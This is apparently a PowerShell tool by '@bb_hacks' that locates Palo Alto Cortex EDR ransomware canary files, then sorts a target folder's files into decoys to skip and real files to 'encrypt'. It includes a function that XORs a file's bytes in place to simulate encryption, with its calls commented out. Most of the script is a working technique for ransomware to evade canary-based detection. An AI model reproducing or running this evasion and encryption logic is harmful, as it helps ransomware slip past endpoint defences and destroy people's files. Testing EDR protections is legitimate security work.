# Function to output a separator line
function Write-Separator {
    Write-Host "===================="
}

# Function to output a title with optional font color
function Write-Title {
    param(
        [string]$title,
        [string]$color = "White"
    )
    Write-Host $title -ForegroundColor $color
}

# Function to process a folder

function Process-Folder {
    param(
        [string]$downloadsFolder
    )
#rite-Title "DEBUG: Folder being passed to be processed: $downloadsFolder"
# Get directory listing using cmd.exe and dir
$cmdListing = cmd /c dir $downloadsFolder /b

# Get directory listing using PowerShell
$psListing = Get-ChildItem -Path $downloadsFolder | Select-Object -ExpandProperty Name

# Compare the lists to find the differences
$differences = Compare-Object -ReferenceObject $cmdListing -DifferenceObject $psListing | Where-Object { $_.SideIndicator -eq "=>" } | Select-Object -ExpandProperty InputObject

    if ($differences -eq 0) {
        Write-Title "No candidate files found in $downloadsFolder. Moving to next most likely folder" -color "Red"
        return $false
    }
# Output a title for the found files
Write-Separator 
Write-Title "Potential Cortex EDR Honeypot/Canary files found in $downloadsFolder" -color "Green"
Write-Separator 
Write-Host ""
# Output the file names present in cmd listing but not in PowerShell listing
foreach ($file in $differences) {
    Write-Title "File: $file"
    
    # Retrieve the target property for the file
    $targetProperty = (Get-Item -Path (Join-Path $downloadsFolder $file)).Target
    
    if ($targetProperty) {
        #Write-Title "Target Path: $targetProperty"
        
        # Remove the filename from the honeypot directory path
        $honeypotDirectory = Split-Path $targetProperty
    } else {
        Write-Title "[!]Target Property not available." -color "Red"
    }
}
Write-Host ""
Write-Separator 
Write-Title "Cortex EDR Ransomware folder discovered" -color "Green"
Write-Separator 
Write-Host ""
Write-Title "Cortex EDR decoy ransomware files are located at : $honeypotDirectory" 
Write-Host ""
# Output a title for the Honeypot finder
Write-Separator 
Write-Title "Files located in the Ransomware Directory" -color "Green"
Write-Separator 
Write-Host ""
# Get directory listing for the Honeypot directory including hidden files
$honeypotListing = Get-ChildItem -Path $honeypotDirectory -Force | Select-Object Name, Length, LastWriteTime, Mode

# Define column widths
$colWidthName = 40
$colWidthSize = 15
$colWidthDate = 25
$colWidthMode = 10

# Output header
$header = "{0,-$colWidthName} {1,-$colWidthSize} {2,-$colWidthDate} {3,-$colWidthMode}" -f "Canary File", "Size (bytes)", "Last Write Date", "Mode"
Write-Host $header -ForegroundColor Green

# Output the filenames, file size, last write date, and mode of all files in the Honeypot directory
foreach ($file in $honeypotListing) {
    $fileName = $file.Name
    $fileSize = $file.Length
    $lastWriteDate = $file.LastWriteTime
    $fileMode = $file.Mode

    $output = "{0,-$colWidthName} {1,-$colWidthSize} {2,-$colWidthDate} {3,-$colWidthMode}" -f $fileName, $fileSize, $lastWriteDate, $fileMode
    Write-Host $output
}
Write-Host ""
return @("Found",$honeypotDirectory)
}

# Function to compare files
function Compare-Files {
   param (
        [string]$honeypotDirectory,
        [string]$targetFile
    )

    # Get the extension of the target file
    $targetExtension = [System.IO.Path]::GetExtension($targetFile).TrimStart('.')
    $targetFileSize = (Get-Item $targetFile).Length

    # Get all files in the honeypot directory
    $filesInDirectory = Get-ChildItem -Path $honeypotDirectory

    $isCanaryFile = $false

    foreach ($file in $filesInDirectory) {
		$full = $file.FullName
		#Write-Host "DEBUG: Checking $Full"
		$FToCheck = [System.IO.Path]::GetExtension($full).TrimStart('.')
		#Write-Host "DEBUG: Checking $FToCheck against $targetExtension"
        if ($FToCheck -eq $targetExtension) {
			if ((Get-Item $file.FullName).Length -eq $targetFileSize) {
                $isCanaryFile = $true
                break
            }
        }
    }

    if ($isCanaryFile) {
        Write-Title "Canary file - to be ignored" -color Yellow
    } else {
        Write-Title "Viable candidate - Encrypting" -color Red
		#CIA-Of-Agent-Is-Fine -targetFile $targetFile
    }
}
#Function to simulate action on file - static xor with byte 0xbb
Function CIA-Of-Agent-Is-Fine {
    param (
        [string]$targetFile
		)
		
# Define the file path and XOR byte value
$filePath = $targetFile
$xorByte = 0xBB # Change this to your desired XOR byte value (0x00 to 0xFF)

# Read the file content as bytes
$fileContent = [System.IO.File]::ReadAllBytes($filePath)

# XOR each byte with the static byte
$xorredContent = $fileContent | ForEach-Object { $_ -bxor $xorByte }

# Write the XOR'd content back to the file
[System.IO.File]::WriteAllBytes($filePath, $xorredContent)

# Write-Host "File has been XOR'd with byte 0x$([System.String]::Format("{0:X2}", $xorByte))"
}
# Function to run the test
function Run-Test {
    param(
        [string]$honeypotdirectory
    )

    # Ask the user if they want to test protection
    $answer = Read-Host "Would you like to test protection? (Y/N)"

    if ($answer -eq "Y" -or $answer -eq "y") {
		# Ask for the target directory path
		$targetdir = Read-Host "Please enter path to test directory"

		# Debug - use default path if no input is provided
		if ([string]::IsNullOrWhiteSpace($targetdir)) {
			$targetdir = "C:\users\Default\Documents\"
			Write-Host "DEBUG: Using default target directory: $targetdir"
		}
		# Get the list of file extensions in the honeypot directory
		$honeypotExtensions = Get-ChildItem -Path $honeypotdirectory -File -Force |
		ForEach-Object { $_.Extension } | Sort-Object -Unique
		#target dir
		# Write-Host "DEBUG: Getting $targetdir files"
		$currentFiles = Get-ChildItem -Path $targetdir -File -Force
		# Filter and output files in the current directory that match the extensions from the honeypot directory
		foreach ($file in $currentFiles){
			# Write-Host "DEBUG: Checking $file"
			# Try to get the file and its size
			# Write-Host "DEBUG: Getting file size"
			$targetFileSize = 0
			try {
			$targetFileSize = (Get-Item $file.FullName).Length
			#If no error do our stuff and send it to Compare-Files
			if ($targetFileSize -ne 0) {
				#Write-Host "File size: $targetFileSize bytes"
				#Check if it is a valid Extension
				$extension = [System.IO.Path]::GetExtension($file.FullName)
				#Write-Host "DEBUG: Checking filextention $extension"
				#Write-Host "DEBUG: HoneyPot Extensions are $honeypotExtensions"
				if ($honeypotExtensions -contains $extension) {
					# The file has a valid extension
					Write-Title "$($file.Name) has a canary extension - checking" -color Green
					$full = $file.FullName
					 #rite-Host "DEBUG: Passing $full and $targetFileSize and $honeypotDirectory and $honeypotExtensions"
					Compare-Files -targetFile $full -HPDir $honeypotdirectory
					} 
					else {
					# The file does not have a valid extension
					$full = $file.FullName
					Write-Title "$($file.Name) does not have a canary extension - encrypting" -color Red
					#CIA-Of-Agent-Is-Fine -targetFile $full
					}
				}
			}
			catch {
			# Handle the case where the file was not found - or should, doesn't work for some reason 
			Write-Host "Error: The file '$file' size could not be determined - this shouldn't happen. Maybe a canary file - skipping."
			}
		}
	} 
	else {
        Write-Host "Protection test cancelled."
    }
}


Write-Title ""
Write-Title "_________                __                  ___________________ __________ " -color "Green"
Write-Title "\_   ___ \  ____________/  |_  ____ ___  ___ \_   _____/\______ \\______   \" -color "Green"
Write-Title "/    \  \/ /  _ \_  __ \   __\/ __ \\  \/  /  |    __)_  |    |  \|       _/" -color "Green"
Write-Title "\     \___(  <_> )  | \/|  | \  ___/ >    <   |        \ |    `   \    |   \" -color "Green"
Write-Title " \______  /\____/|__|   |__|  \___  >__/\_ \ /_______  //_______  /____|_  /" -color "Green"
Write-Title "        \/                        \/      \/         \/         \/       \/ " -color "Green"
Write-Title ""
Write-Title "Find potential Cortex ransomware canary files and display candidates" -color "Green"
Write-Title ""
Write-Title "by @bb_hacks" -color "Yellow"
Write-Title ""

# Get the downloads folder path
# write-host "DEBUG: Starting"
# $havefound = $false
$foldersToCheck = @("", "Downloads", "Documents", "Desktop", "Music", "Pictures", "Videos")

foreach ($folder in $foldersToCheck) {
    $folderPath = Join-Path $env:USERPROFILE $folder
	$havefound = @()
    $havefound = Process-Folder -downloadsFolder $folderPath
	$status = $havefound[-2]
	$honeypotDirectory = $havefound[-1]
	#Write-Host "DEBUG : Checking $folderpath"
	#Write-Host "DEBUG : Status is $status"
	#Write-host "DEBUG : Path Found : $honeypotDirectory"
	if ($status -eq "Found") {
        $NextStep = Run-Test -honeypotdirectory $honeypotDirectory
		exit
    }
}
Write-Host ""
Write-Separator 
Write-Title "No candidate files found"  -color "Red"
Write-Separator 
Write-Host ""